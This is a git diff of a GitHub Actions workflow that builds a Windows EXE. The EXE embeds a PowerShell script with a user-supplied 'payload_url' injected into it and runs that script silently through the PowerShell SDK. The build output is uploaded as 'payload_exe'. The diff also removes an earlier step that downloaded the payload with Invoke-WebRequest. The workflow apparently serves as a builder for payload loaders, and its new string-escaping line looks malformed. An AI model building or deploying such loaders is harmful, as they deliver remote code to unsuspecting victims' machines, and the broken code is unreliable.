@@ -1,9 +1,6 @@
 name: Build PowerShell EXE using .NET
 
 on:
-  push:
-    branches:
-      - main
   workflow_dispatch:
     inputs:
       payload_url:
@@ -16,114 +13,53 @@ jobs:
     runs-on: windows-latest
 
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v3
+    - name: Checkout code
+      uses: actions/checkout@v3
 
-      - name: Debug - List Files
-        shell: powershell
-        run: |
-          Write-Host "[INFO] Listing all files in workspace:"
-          Get-ChildItem -Path ${{ github.workspace }} -Recurse
+    - name: Install .NET SDK
+      run: dotnet --version
 
-      - name: Fetch Payload Script
-        shell: powershell
-        run: |
-          $url = '${{ github.event.inputs.payload_url }}'
-          Write-Host "[INFO] Fetching payload script from $url..."
-          Invoke-WebRequest -Uri $url -OutFile 'payload.ps1'
-          Write-Host "[INFO] Payload script downloaded as payload.ps1"
+    - name: Inject URL into static_code.ps1
+      run: |
+        $url = '${{ github.event.inputs.payload_url }}'
+        (Get-Content static_code.ps1) -replace '__PAYLOAD_URL__', $url | Set-Content static_code.ps1
 
-      - name: Locate static_code.ps1 and Inject URL
-        shell: powershell
-        run: |
-          $scriptPath = "$env:GITHUB_WORKSPACE\static_code.ps1"
+    - name: Create .NET console project
+      run: |
+        dotnet new console -o PowerShellRunner
+        cd PowerShellRunner
+        dotnet add package Microsoft.PowerShell.SDK
 
-          if (-Not (Test-Path $scriptPath)) {
-              Write-Host "[ERROR] static_code.ps1 not found at expected location: $scriptPath"
-              Get-ChildItem -Path $env:GITHUB_WORKSPACE -Recurse
-              exit 1
-          }
+    - name: Generate C# code with Embedded PowerShell Script
+      shell: powershell
+      run: |
+        $ps_script = Get-Content -Path 'static_code.ps1' -Raw
+        $escaped_script = $ps_script -replace """, """" -replace "r?n", "n"
 
-          Write-Host "[INFO] Found static_code.ps1 at $scriptPath"
-          $url = '${{ github.event.inputs.payload_url }}'
-          (Get-Content -Path $scriptPath) -replace '__PAYLOAD_URL__', $url | Set-Content -Path $scriptPath
-          Write-Host "[INFO] URL injected into static_code.ps1"
+        $csharp_code = @"
+        using System;
+        using System.Management.Automation;
 
-      - name: Install .NET SDK
-        shell: powershell
-        run: |
-          if (-Not (Get-Command "dotnet" -ErrorAction SilentlyContinue)) {
-              Write-Host "[ERROR] .NET SDK not found!"
-              exit 1
-          }
-          Write-Host "[INFO] .NET SDK found. Version:"
-          dotnet --version
+        class Program {
+            static void Main() {
+                string script = @"$escaped_script";
+                using (PowerShell ps = PowerShell.Create()) {
+                    ps.AddScript(script);
+                    ps.Invoke();
+                }
+            }
+        }
+        "@
 
-      - name: Create .NET Console Project
-        shell: powershell
-        run: |
-          Write-Host "[INFO] Creating .NET console project..."
-          dotnet new console -o PowerShellRunner
-          cd PowerShellRunner
-          dotnet add package Microsoft.PowerShell.SDK
-          Write-Host "[SUCCESS] .NET project created."
+        Set-Content -Path 'PowerShellRunner/Program.cs' -Value $csharp_code
 
-      - name: Generate C# Code with Embedded PowerShell Script
-        shell: powershell
-        run: |
-          $scriptPath = "$env:GITHUB_WORKSPACE\static_code.ps1"
-          
-          if (-Not (Test-Path $scriptPath)) {
-              Write-Host "[ERROR] static_code.ps1 not found before embedding!"
-              exit 1
-          }
+    - name: Build EXE
+      run: |
+        cd PowerShellRunner
+        dotnet build -c Release
 
-          Write-Host "[INFO] Reading PowerShell script..."
-          $psScript = Get-Content -Path $scriptPath -Raw
-          
-          Write-Host "[INFO] Escaping PowerShell script for C#..."
-          $escapedScript = $psScript -replace "\\", "\\\\" -replace "`"", "\\`"" -replace "`r?`n", "\n"
-
-          $csharpCode = @"
-          using System;
-          using System.Management.Automation;
-
-          class Program {
-              static void Main() {
-                  Console.WriteLine("[INFO] PowerShell execution started from C#.");
-                  string script = @`"$escapedScript`";
-                  
-                  using (PowerShell ps = PowerShell.Create()) {
-                      ps.AddScript(script);
-                      var results = ps.Invoke();
-                      Console.WriteLine("[INFO] Execution Results:");
-                      foreach (var result in results) {
-                          Console.WriteLine(result);
-                      }
-                      if (ps.HadErrors) {
-                          Console.WriteLine("[ERROR] PowerShell encountered an error.");
-                          foreach (var error in ps.Streams.Error) {
-                              Console.WriteLine(error.ToString());
-                          }
-                      }
-                  }
-                  Console.WriteLine("[SUCCESS] PowerShell execution completed.");
-                  Console.WriteLine("Press Enter to exit...");
-                  Console.ReadLine();
-              }
-          }
-          "@
-          Set-Content -Path "$env:GITHUB_WORKSPACE\PowerShellRunner\Program.cs" -Value $csharpCode
-          Write-Host "[SUCCESS] C# code written to PowerShellRunner/Program.cs"
-
-      - name: Build EXE
-        shell: powershell
-        run: |
-          cd PowerShellRunner
-          dotnet build -c Release
-
-      - name: Upload Executable
-        uses: actions/upload-artifact@v4
-        with:
-          name: payload_exe
-          path: PowerShellRunner/bin/Release/**/PowerShellRunner.exe
+    - name: Upload executable
+      uses: actions/upload-artifact@v4
+      with:
+        name: payload_exe
+        path: PowerShellRunner/bin/Release/net9.0/PowerShellRunner.exe
